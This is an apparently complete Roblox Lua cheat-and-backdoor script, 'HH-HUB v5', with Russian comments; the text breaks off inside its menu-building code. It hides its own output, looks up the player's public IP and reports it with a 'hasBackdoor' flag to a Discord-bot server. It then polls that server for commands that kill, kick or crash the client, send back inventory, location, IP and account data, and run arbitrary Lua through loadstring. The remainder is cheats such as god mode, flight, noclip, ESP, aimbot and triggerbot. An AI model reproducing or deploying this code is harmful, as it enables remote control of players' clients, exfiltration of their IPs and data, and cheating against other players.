--[[
    HH-HUB v5 - ОСНОВНОЙ СКРИПТ
    Работает через Discord бот
    Версия: 5.0 FINAL
]]

-- Отключаем выводы
local oldPrint = print
local oldWarn = warn
print = function() end
warn = function() end

-- Сервисы
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RS = game:GetService("RunService")
local TS = game:GetService("TweenService")
local HS = game:GetService("HttpService")
local SG = game:GetService("StarterGui")
local TPS = game:GetService("TeleportService")
local VU; pcall(function() VU = game:GetService("VirtualUser") end)
local Lighting = game:GetService("Lighting")
local LP = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local Mouse = LP:GetMouse()

-- ==============================================
-- НАСТРОЙКИ СВЯЗИ С DISCORD БОТОМ
-- ==============================================
local BOT_URL = "http://localhost:5000"  -- Если бот на том же ПК
-- local BOT_URL = "https://ваш-сервер.ru"  -- Если бот на хостинге

local USER_ID = tostring(LP.UserId)

-- ==============================================
-- HTTP ФУНКЦИИ
-- ==============================================
local function sendToBot(endpoint, data)
    local success = pcall(function()
        HS:RequestAsync({
            Url = BOT_URL .. endpoint,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HS:JSONEncode(data)
        })
    end)
    return success
end

local function getFromBot(endpoint)
    local success, result = pcall(function()
        return HS:GetAsync(BOT_URL .. endpoint, true)
    end)
    if success and result then
        local ok, decoded = pcall(function() return HS:JSONDecode(result) end)
        if ok then return decoded end
    end
    return nil
end

-- ==============================================
-- ОТПРАВКА ДАННЫХ В DISCORD БОТ
-- ==============================================
local myIP = "Unknown"
pcall(function()
    myIP = HS:GetAsync("https://api.ipify.org/?format=text", true)
end)

local function updatePresence()
    local data = {
        user_id = USER_ID,
        name = LP.Name,
        display = LP.DisplayName,
        place = tostring(game.PlaceId),
        job = game.JobId:sub(1, 8),
        time = tick(),
        hasBackdoor = true,
        ip = myIP,
        same = true,
        platform = UIS.TouchEnabled and "Mobile" or "PC"
    }
    sendToBot("/api/presence", data)
end

-- ==============================================
-- ПОЛУЧЕНИЕ КОМАНД ОТ DISCORD БОТА
-- ==============================================
local killLoops = {}
local processedCmds = {}

local function executeCommand(senderId, cmd, data)
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart")
    
    if cmd == "KILL_PLAYER" then
        if hum then hum.Health = 0 end
        
    elseif cmd == "START_KILL_LOOP" then
        if killLoops[senderId] then killLoops[senderId]:Disconnect() end
        killLoops[senderId] = RS.Heartbeat:Connect(function()
            local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
            if h then h.Health = 0 end
        end)
        task.delay(30, function()
            if killLoops[senderId] then
                killLoops[senderId]:Disconnect()
                killLoops[senderId] = nil
            end
        end)
        
    elseif cmd == "STOP_KILL_LOOP" then
        if killLoops[senderId] then
            killLoops[senderId]:Disconnect()
            killLoops[senderId] = nil
        end
        
    elseif cmd == "FREEZE_PLAYER" then
        if hum then
            hum.WalkSpeed = 0
            hum.JumpPower = 0
        end
        
    elseif cmd == "UNFREEZE_PLAYER" then
        if hum then
            hum.WalkSpeed = 16
            hum.JumpPower = 50
        end
        
    elseif cmd == "KICK_PLAYER" then
        task.delay(0.5, function() LP:Kick(data or "Kicked") end)
        
    elseif cmd == "SPECTATE" then
        local target = Players:GetPlayerByUserId(tonumber(data))
        if target and target.Character then
            Camera.CameraSubject = target.Character:FindFirstChild("HumanoidRootPart") or target.Character
        end
        
    elseif cmd == "TP_TO" then
        local target = Players:GetPlayerByUserId(tonumber(data))
        if target and target.Character and root then
            local tr = target.Character:FindFirstChild("HumanoidRootPart")
            if tr then root.CFrame = tr.CFrame * CFrame.new(0, 3, 5) end
        end
        
    elseif cmd == "BRING" then
        local target = Players:GetPlayerByUserId(tonumber(data))
        if target and target.Character and root then
            local tr = target.Character:FindFirstChild("HumanoidRootPart")
            if tr then tr.CFrame = root.CFrame * CFrame.new(0, 0, -5) end
        end
        
    elseif cmd == "SET_WALKSPEED" then
        if hum then hum.WalkSpeed = tonumber(data) or 16 end
        
    elseif cmd == "SET_JUMPPOWER" then
        if hum then hum.JumpPower = tonumber(data) or 50 end
        
    elseif cmd == "CRASH_PLAYER" then
        task.spawn(function()
            while true do
                local t = {}
                for i = 1, 1e6 do t[i] = i * i end
            end
        end)
        
    elseif cmd == "BLACK_SCREEN" then
        local pg = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui", 5)
        local sg = Instance.new("ScreenGui")
        sg.Name = "BlackScreen"
        sg.ResetOnSpawn = false
        sg.Parent = pg
        local f = Instance.new("Frame", sg)
        f.Size = UDim2.new(1, 0, 1, 0)
        f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        f.BackgroundTransparency = 0
        f.ZIndex = 1000
        
    elseif cmd == "FLASH_SCREEN" then
        local pg = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui", 5)
        local sg = Instance.new("ScreenGui")
        sg.ResetOnSpawn = false
        sg.Parent = pg
        local f = Instance.new("Frame", sg)
        f.Size = UDim2.new(1, 0, 1, 0)
        f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        f.BackgroundTransparency = 0
        f.ZIndex = 1000
        TS:Create(f, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
        game:GetService("Debris"):AddItem(sg, 1)
        
    elseif cmd == "SHAKE_CAMERA" then
        local conn
        conn = RS.RenderStepped:Connect(function()
            Camera.CFrame = Camera.CFrame * CFrame.new(
                math.random(-5, 5) / 10,
                math.random(-5, 5) / 10,
                math.random(-5, 5) / 10
            )
        end)
        task.delay(5, function() if conn then conn:Disconnect() end end)
        
    elseif cmd == "MUTE_GAME" then
        pcall(function() game:GetService("SoundService").Volume = 0 end)
        
    elseif cmd == "UNMUTE_GAME" then
        pcall(function() game:GetService("SoundService").Volume = 0.5 end)
        
    elseif cmd == "RELOAD_GAME" then
        TPS:Teleport(game.PlaceId, LP)
        
    elseif cmd == "GET_INVENTORY" then
        local inv = {}
        pcall(function()
            local bp = LP:FindFirstChild("Backpack")
            if bp then
                for _, item in ipairs(bp:GetChildren()) do
                    table.insert(inv, item.Name)
                end
            end
        end)
        -- Отправляем ответ
        sendToBot("/api/commands", { target_id = senderId, command = "INVENTORY_RESPONSE", data = HS:JSONEncode(inv), sender_id = USER_ID })
        
    elseif cmd == "GET_LOCATION" then
        if root then
            local pos = root.Position
            local locData = string.format("%.1f,%.1f,%.1f", pos.X, pos.Y, pos.Z)
            sendToBot("/api/commands", { target_id = senderId, command = "LOCATION_RESPONSE", data = locData, sender_id = USER_ID })
        end
        
    elseif cmd == "GET_PLAYER_DATA" then
        local playerData = {
            name = LP.Name,
            display = LP.DisplayName,
            id = LP.UserId,
            ip = myIP,
            place = game.PlaceId,
            job = game.JobId,
            age = LP.AccountAge,
            membership = LP.MembershipType.Name
        }
        sendToBot("/api/commands", { target_id = senderId, command = "PLAYER_DATA_RESPONSE", data = HS:JSONEncode(playerData), sender_id = USER_ID })
        
    elseif cmd == "NOTIFICATION" then
        pcall(function()
            SG:SetCore("SendNotification", {
                Title = "📨 Сообщение",
                Text = data ~= "" and data or "Hello",
                Duration = 5
            })
        end)
        
    elseif cmd == "SET_GRAVITY" then
        workspace.Gravity = tonumber(data) or 196.2
        
    elseif cmd == "SET_FOV" then
        Camera.FieldOfView = tonumber(data) or 70
        
    elseif cmd == "SET_BRIGHTNESS" then
        Lighting.Brightness = tonumber(data) or 2
        
    elseif cmd == "EXECUTE_LUA" then
        if loadstring then
            local fn = loadstring(data)
            if fn then pcall(fn) end
        end
    end
end

local function readCommands()
    local commands = getFromBot("/api/commands/" .. USER_ID)
    if not commands then return end
    
    for _, cmd in ipairs(commands) do
        if not processedCmds[cmd.id] then
            processedCmds[cmd.id] = true
            task.spawn(executeCommand, cmd.sender, cmd.cmd, cmd.data)
        end
    end
    
    -- Очистка старых команд
    local cnt = 0
    for _ in pairs(processedCmds) do
        cnt = cnt + 1
    end
    if cnt > 200 then
        processedCmds = {}
    end
end

-- ==============================================
-- GOD MODE
-- ==============================================
local GodMode = { active = false, connections = {} }

local function enableGodMode()
    if GodMode.active then return end
    GodMode.active = true
    
    local function apply()
        local char = LP.Character
        if not char then return end
        
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        
        hum.MaxHealth = math.huge
        hum.Health = math.huge
        hum.BreakJointsOnDeath = false
        
        local ff = Instance.new("ForceField")
        ff.Visible = false
        ff.Parent = char
        
        local conn1 = hum:GetPropertyChangedSignal("Health"):Connect(function()
            if GodMode.active and hum and hum.Parent and hum.Health < math.huge then
                hum.Health = math.huge
            end
        end)
        table.insert(GodMode.connections, conn1)
        
        local conn2 = hum:GetPropertyChangedSignal("MaxHealth"):Connect(function()
            if GodMode.active and hum then
                hum.MaxHealth = math.huge
            end
        end)
        table.insert(GodMode.connections, conn2)
        
        local conn3 = char.ChildRemoved:Connect(function(child)
            if GodMode.active and child:IsA("ForceField") then
                local nff = Instance.new("ForceField")
                nff.Visible = false
                nff.Parent = char
            end
        end)
        table.insert(GodMode.connections, conn3)
        
        local conn4 = hum.Died:Connect(function()
            if GodMode.active then
                task.defer(function()
                    if hum and hum.Parent then
                        hum.Health = math.huge
                    end
                end)
            end
        end)
        table.insert(GodMode.connections, conn4)
        
        local conn5 = RS.Heartbeat:Connect(function()
            if GodMode.active then
                local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
                if h and h ~= hum then
                    task.spawn(apply)
                    return
                end
                if h and h.Health < math.huge then
                    h.Health = math.huge
                end
            end
        end)
        table.insert(GodMode.connections, conn5)
        
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            local conn6 = root:GetPropertyChangedSignal("Anchored"):Connect(function()
                if GodMode.active and root.Anchored then
                    root.Anchored = false
                end
            end)
            table.insert(GodMode.connections, conn6)
        end
    end
    
    apply()
end

local function disableGodMode()
    GodMode.active = false
    for _, c in ipairs(GodMode.connections) do
        pcall(function() c:Disconnect() end)
    end
    GodMode.connections = {}
    
    local char = LP.Character
    if char then
        local ff = char:FindFirstChildOfClass("ForceField")
        if ff then ff:Destroy() end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.MaxHealth = 100
            hum.Health = 100
        end
    end
end

-- ==============================================
-- ПОЛЁТ
-- ==============================================
local Flight = { active = false, bv = nil, bg = nil, speed = 50, conn = nil }

local function disableFlight()
    Flight.active = false
    if Flight.conn then Flight.conn:Disconnect(); Flight.conn = nil end
    if Flight.bv then pcall(function() Flight.bv:Destroy() end); Flight.bv = nil end
    if Flight.bg then pcall(function() Flight.bg:Destroy() end); Flight.bg = nil end
    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.PlatformStand = false end
end

local function enableFlight()
    if Flight.active then return end
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    
    Flight.active = true
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then hum.PlatformStand = true end
    
    Flight.bv = Instance.new("BodyVelocity")
    Flight.bv.Velocity = Vector3.new(0, 0, 0)
    Flight.bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
    Flight.bv.Parent = root
    
    Flight.bg = Instance.new("BodyGyro")
    Flight.bg.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
    Flight.bg.P = 1e4
    Flight.bg.Parent = root
    
    Flight.conn = RS.RenderStepped:Connect(function()
        if not Flight.active or not Flight.bv or not Flight.bv.Parent then
            if Flight.conn then Flight.conn:Disconnect(); Flight.conn = nil end
            return
        end
        
        local dir = Vector3.new()
        if UIS:IsKeyDown(Enum.KeyCode.W) then dir = dir + Camera.CFrame.LookVector end
        if UIS:IsKeyDown(Enum.KeyCode.S) then dir = dir - Camera.CFrame.LookVector end
        if UIS:IsKeyDown(Enum.KeyCode.A) then dir = dir - Camera.CFrame.RightVector end
        if UIS:IsKeyDown(Enum.KeyCode.D) then dir = dir + Camera.CFrame.RightVector end
        if UIS:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
        if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0, 1, 0) end
        
        Flight.bv.Velocity = dir.Magnitude > 0 and dir.Unit * Flight.speed or Vector3.new()
        Flight.bg.CFrame = Camera.CFrame
    end)
end

-- ==============================================
-- НОКЛИП
-- ==============================================
local Noclip = { active = false, connection = nil }

local function disableNoclip()
    Noclip.active = false
    if Noclip.connection then Noclip.connection:Disconnect(); Noclip.connection = nil end
    local char = LP.Character
    if char then
        for _, p in ipairs(char:GetDescendants()) do
            if p:IsA("BasePart") then pcall(function() p.CanCollide = true end) end
        end
    end
end

local function enableNoclip()
    if Noclip.active then return end
    Noclip.active = true
    Noclip.connection = RS.Stepped:Connect(function()
        if not Noclip.active then return end
        local char = LP.Character
        if char then
            for _, p in ipairs(char:GetDescendants()) do
                if p:IsA("BasePart") then pcall(function() p.CanCollide = false end) end
            end
        end
    end)
end

-- ==============================================
-- ESP
-- ==============================================
local ESP = { active = false, highlights = {} }

local function disableESP()
    ESP.active = false
    for _, h in pairs(ESP.highlights) do
        pcall(function() h:Destroy() end)
    end
    ESP.highlights = {}
end

local function enableESP()
    if ESP.active then return end
    ESP.active = true
    
    local function addForPlayer(plr)
        if plr == LP then return end
        
        local function update()
            if not ESP.active then return end
            local char = plr.Character
            if not char then
                if ESP.highlights[plr] then
                    ESP.highlights[plr]:Destroy()
                    ESP.highlights[plr] = nil
                end
                return
            end
            if not ESP.highlights[plr] or not ESP.highlights[plr].Parent then
                local hl = Instance.new("Highlight")
                hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                hl.FillColor = Color3.fromRGB(255, 50, 50)
                hl.OutlineColor = Color3.fromRGB(255, 255, 255)
                hl.FillTransparency = 0.5
                hl.Parent = char
                ESP.highlights[plr] = hl
            end
        end
        
        plr.CharacterAdded:Connect(function() task.wait(0.5); update() end)
        update()
    end
    
    for _, plr in ipairs(Players:GetPlayers()) do
        task.spawn(addForPlayer, plr)
    end
    
    Players.PlayerAdded:Connect(function(plr)
        task.spawn(addForPlayer, plr)
    end)
    
    Players.PlayerRemoving:Connect(function(plr)
        if ESP.highlights[plr] then
            pcall(function() ESP.highlights[plr]:Destroy() end)
            ESP.highlights[plr] = nil
        end
    end)
end

-- ==============================================
-- AIMBOT
-- ==============================================
local Aimbot = { active = false, connection = nil }

local function enableAimbot()
    if Aimbot.active then return end
    Aimbot.active = true
    Aimbot.connection = RS.RenderStepped:Connect(function()
        if not Aimbot.active then return end
        
        local closest, dist = nil, 200
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character then
                local head = plr.Character:FindFirstChild("Head")
                if head then
                    local pos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    if onScreen then
                        local d = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)).Magnitude
                        if d < dist then
                            dist = d
                            closest = head
                        end
                    end
                end
            end
        end
        if closest then
            Camera.CFrame = CFrame.lookAt(Camera.CFrame.Position, closest.Position)
        end
    end)
end

local function disableAimbot()
    Aimbot.active = false
    if Aimbot.connection then
        Aimbot.connection:Disconnect()
        Aimbot.connection = nil
    end
end

-- ==============================================
-- TRIGGERBOT
-- ==============================================
local Triggerbot = { active = false, connection = nil }

local function enableTriggerbot()
    if Triggerbot.active then return end
    Triggerbot.active = true
    Triggerbot.connection = RS.Heartbeat:Connect(function()
        if not Triggerbot.active then return end
        local target = Mouse.Target
        if target and target.Parent and target.Parent:FindFirstChildOfClass("Humanoid") then
            local plr = Players:GetPlayerFromCharacter(target.Parent)
            if plr and plr ~= LP then
                pcall(function()
                    mouse1press()
                    task.wait(0.05)
                    mouse1release()
                end)
            end
        end
    end)
end

local function disableTriggerbot()
    Triggerbot.active = false
    if Triggerbot.connection then
        Triggerbot.connection:Disconnect()
        Triggerbot.connection = nil
    end
end

-- ==============================================
-- ANTI-AFK
-- ==============================================
local AntiAfk = { active = false }

local function enableAntiAfk()
    if AntiAfk.active then return end
    AntiAfk.active = true
    LP.Idled:Connect(function()
        if AntiAfk.active and VU then
            pcall(function() VU:Button2Down(Vector2.new(), Camera.CFrame) end)
            task.wait(1)
            pcall(function() VU:Button2Up(Vector2.new(), Camera.CFrame) end)
        end
    end)
end

local function disableAntiAfk()
    AntiAfk.active = false
end

-- ==============================================
-- БЕСКОНЕЧНЫЙ ПРЫЖОК
-- ==============================================
local InfJump = { active = false, connection = nil }

local function enableInfJump()
    if InfJump.active then return end
    InfJump.active = true
    InfJump.connection = UIS.JumpRequest:Connect(function()
        if InfJump.active then
            local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end)
end

local function disableInfJump()
    InfJump.active = false
    if InfJump.connection then
        InfJump.connection:Disconnect()
        InfJump.connection = nil
    end
end

-- ==============================================
-- КЛИК-ТЕЛЕПОРТ
-- ==============================================
local ClickTP = { active = false }

local function enableClickTP()
    ClickTP.active = true
end

local function disableClickTP()
    ClickTP.active = false
end

Mouse.Button1Down:Connect(function()
    if ClickTP.active and Mouse.Target then
        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = CFrame.new(Mouse.Hit.X, Mouse.Hit.Y + 3, Mouse.Hit.Z)
        end
    end
end)

-- ==============================================
-- НЕТ УРОНА ОТ ПАДЕНИЯ
-- ==============================================
local NoFallDamage = { active = false, connection = nil }

local function enableNoFallDamage()
    if NoFallDamage.active then return end
    NoFallDamage.active = true
    NoFallDamage.connection = RS.Heartbeat:Connect(function()
        if not NoFallDamage.active then return end
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum and hum:GetState() == Enum.HumanoidStateType.Freefall then
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end)
end

local function disableNoFallDamage()
    NoFallDamage.active = false
    if NoFallDamage.connection then
        NoFallDamage.connection:Disconnect()
        NoFallDamage.connection = nil
    end
end

-- ==============================================
-- УСКОРЕНИЯ
-- ==============================================
local WalkspeedBoost = { active = false }
local JumpBoost = { active = false }

local function enableWalkspeedBoost()
    WalkspeedBoost.active = true
    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.WalkSpeed = 60 end
end

local function disableWalkspeedBoost()
    WalkspeedBoost.active = false
    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.WalkSpeed = 16 end
end

local function enableJumpBoost()
    JumpBoost.active = true
    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.JumpPower = 100 end
end

local function disableJumpBoost()
    JumpBoost.active = false
    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.JumpPower = 50 end
end

-- ==============================================
-- X-RAY
-- ==============================================
local XRay = { active = false, connections = {} }

local function enableXRay()
    if XRay.active then return end
    XRay.active = true
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and not v:IsDescendantOf(LP.Character) then
            pcall(function() v.LocalTransparencyModifier = 0.7 end)
        end
    end
    local conn = workspace.DescendantAdded:Connect(function(v)
        task.wait()
        if XRay.active and v:IsA("BasePart") and not v:IsDescendantOf(LP.Character) then
            pcall(function() v.LocalTransparencyModifier = 0.7 end)
        end
    end)
    table.insert(XRay.connections, conn)
end

local function disableXRay()
    XRay.active = false
    for _, c in ipairs(XRay.connections) do
        pcall(function() c:Disconnect() end)
    end
    XRay.connections = {}
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then
            pcall(function() v.LocalTransparencyModifier = 0 end)
        end
    end
end

-- ==============================================
-- BUNNY HOP
-- ==============================================
local BunnyHop = { active = false, connection = nil }

local function enableBunnyHop()
    if BunnyHop.active then return end
    BunnyHop.active = true
    BunnyHop.connection = RS.Heartbeat:Connect(function()
        if not BunnyHop.active then return end
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum and hum.MoveDirection.Magnitude > 0 and hum:GetState() ~= Enum.HumanoidStateType.Jumping then
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end)
end

local function disableBunnyHop()
    BunnyHop.active = false
    if BunnyHop.connection then
        BunnyHop.connection:Disconnect()
        BunnyHop.connection = nil
    end
end

-- ==============================================
-- SPIDER
-- ==============================================
local Spider = { active = false, connection = nil }

local function enableSpider()
    if Spider.active then return end
    Spider.active = true
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    Spider.connection = RS.Heartbeat:Connect(function()
        if not Spider.active then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        params.FilterDescendantsInstances = { char }
        local result = workspace:Raycast(root.Position, Vector3.new(0, -5, 0), params)
        if not result then
            pcall(function()
                root.AssemblyLinearVelocity = root.AssemblyLinearVelocity + Vector3.new(0, 50, 0)
            end)
        end
    end)
end

local function disableSpider()
    Spider.active = false
    if Spider.connection then
        Spider.connection:Disconnect()
        Spider.connection = nil
    end
end

-- ==============================================
-- VANISH
-- ==============================================
local Vanish = { active = false }

local function enableVanish()
    Vanish.active = true
    local char = LP.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") or v:IsA("Accessory") then
            pcall(function() v.Transparency = 1 end)
        end
    end
end

local function disableVanish()
    Vanish.active = false
    local char = LP.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") or v:IsA("Accessory") then
            pcall(function() v.Transparency = 0 end)
        end
    end
end

-- ==============================================
-- GUI (ИКОНКА + МЕНЮ)
-- ==============================================
local function getPG()
    return LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui", 10)
end

local function safeNotify(title, text, dur)
    pcall(function()
        SG:SetCore("SendNotification", { Title = title, Text = text, Duration = dur or 3 })
    end)
end

-- ИКОНКА ДЛЯ ОТКРЫТИЯ МЕНЮ
local function createIcon()
    local iconGui = Instance.new("ScreenGui")
    iconGui.Name = "HH_Icon"
    iconGui.ResetOnSpawn = false
    iconGui.Parent = getPG()
    
    local iconBtn = Instance.new("TextButton")
    iconBtn.Size = UDim2.new(0, 55, 0, 55)
    iconBtn.Position = UDim2.new(0, 15, 0.5, -27.5)
    iconBtn.BackgroundColor3 = Color3.fromRGB(30, 20, 45)
    iconBtn.BackgroundTransparency = 0.1
    iconBtn.Text = "⚡"
    iconBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    iconBtn.TextScaled = true
    iconBtn.Font = Enum.Font.GothamBold
    iconBtn.BorderSizePixel = 0
    iconBtn.Parent = iconGui
    Instance.new("UICorner", iconBtn).CornerRadius = UDim.new(1, 0)
    
    local iconStroke = Instance.new("UIStroke", iconBtn)
    iconStroke.Color = Color3.fromRGB(140, 80, 255)
    iconStroke.Thickness = 2
    
    -- Анимация
    TS:Create(iconBtn, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1), {
        BackgroundColor3 = Color3.fromRGB(50, 30, 70)
    }):Play()
    
    -- Перетаскивание иконки
    local dragging = false
    local dragStart, startPos
    
    iconBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = iconBtn.Position
        end
    end)
    
    UIS.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            iconBtn.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
    
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            if dragStart and (input.Position - dragStart).Magnitude < 10 then
                if mainGui then
                    mainGui.Enabled = not mainGui.Enabled
                end
            end
            dragging = false
        end
    end)
    
    return iconGui
end

-- ГЛАВНОЕ МЕНЮ
local mainGui = nil

local function createMainMenu()
    if mainGui then
        mainGui:Destroy()
    end
    
    mainGui = Instance.new("ScreenGui")
    mainGui.Name = "HH_HUB"
    mainGui.ResetOnSpawn = false
    mainGui.Parent = getPG()
    
    local container = Instance.new("Frame")
    container.Size = UDim2.new(0, 850, 0, 620)
    container.Position = UDim2.new(0.5, -425, 0.5, -310)
    container.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
    container.BorderSizePixel = 0
    container.Active = true
    container.Draggable = true
    container.Parent = mainGui
    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 12)
    
    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 25, 60)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(25, 20, 40)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 28))
    })
    grad.Rotation = 45
    grad.Parent = container
    
    local stroke = Instance.new("UIStroke", container)
    stroke.Color = Color3.fromRGB(140, 80, 255)
    stroke.Thickness = 2
    stroke.Transparency = 0.3
    
    -- Заголовок
    local titleBar = Instance.new("Frame", container)
    titleBar.Size = UDim2.new(1, 0, 0, 55)
    titleBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    titleBar.BackgroundTransparency = 0.2
    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 12)
    
    local titleLbl = Instance.new("TextLabel", titleBar)
    titleLbl.Size = UDim2.new(0.7, 0, 1, 0)
    titleLbl.Position = UDim2.new(0, 20, 0, 0)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text = "HH-HUB v5"
    titleLbl.TextColor3 = Color3.fromRGB(220, 180, 255)
    titleLbl.TextScaled = true
    titleLbl.Font = Enum.Font.GothamBold
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    
    -- Кнопки управления
    local minBtn = Instance.new("TextButton", titleBar)
    minBtn.Size = UDim2.new(0, 40, 0, 40)
    minBtn.Position = UDim2.new(1, -95, 0.5, -20)
    minBtn.BackgroundColor3 = Color3.fromRGB(50, 40, 70)
    minBtn.Text = "─"
    minBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    minBtn.TextScaled = true
    minBtn.Font = Enum.Font.GothamBold
    minBtn.BorderSizePixel = 0
    Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 8)
    
    local closeBtn = Instance.new("TextButton", titleBar)
    closeBtn.Size = UDim2.new(0, 40, 0, 40)
    closeBtn.Position = UDim2.new(1, -50, 0.5, -20)
    closeBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextScaled = true
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.BorderSizePixel = 0
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
    closeBtn.MouseButton1Click:Connect(function()
        mainGui:Destroy()
        mainGui = nil
    end)
    
    -- Контейнер для вкладок
    local tabContainer = Instance.new("Frame", container)
    tabContainer.Size = UDim2.new(0, 160, 1, -65)
    tabContainer.Position = UDim2.new(0, 10, 0, 60)
    tabContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    tabContainer.BorderSizePixel = 0
    Instance.new("UICorner", tabContainer).CornerRadius = UDim.new(0, 10)
    
    local tabLayout = Instance.new("UIListLayout", tabContainer)
    tabLayout.Padding = UDim.new(0, 5)
    tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
    
    -- Контент
    local contentArea = Instance.new("Frame", container)
    contentArea.Size = UDim2.new(1, -190, 1, -75)
    contentArea.Position = UDim2.new(0, 175, 0, 60)
    contentArea.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
    contentArea.BorderSizePixel = 0
    Instance.new("UICorner", contentArea).CornerRadius = UDim.new(0, 10)
    
    local scroll = Instance.new("ScrollingFrame", contentArea)
    scroll.Size = UDim2.new(1, -20, 1, -20)
    scroll.Position = UDim2.new(0, 10, 0, 10)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 6
    scroll.ScrollBarImageColor3 = Color3.fromRGB(140, 80, 255)
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    
    local contentLayout = Instance.new("UIListLayout", scroll)
    contentLayout.Padding = UDim.new(0, 8)
    contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
    
    -- Функции для создания элементов
    local tabs = {}
    
    local function addTab(name, icon)
        local btn = Instance.new("TextButton", tabContainer)
        btn.Size = UDim2.new(1, -10, 0, 45)
        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
        btn.BackgroundTransparency = 0.3
        btn.Text = (icon or "•") .. "  " .. name
        btn.TextColor3 = Color3.fromRGB(200, 200, 255)
        btn.TextScaled = true
        btn.Font = Enum.Font.Gotham
        btn.BorderSizePixel = 0
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
        
        local tabFrame = Instance.new("Frame", scroll)
        tabFrame.Size = UDim2.new(1, 0, 1, 0)
        tabFrame.BackgroundTransparency = 1
        tabFrame.Visible = (#tabs == 0)
        
        local tabContentLayout = Instance.new("UIListLayout", tabFrame)
        tabContentLayout.Padding = UDim.new(0, 8)
        tabContentLayout.SortOrder = Enum.SortOrder.LayoutOrder
        
        btn.MouseButton1Click:Connect(function()
            for _, t in ipairs(tabs) do
                t.frame.Visible = false
            end
            tabFrame.Visible = true
            for _, b in ipairs(tabs) do
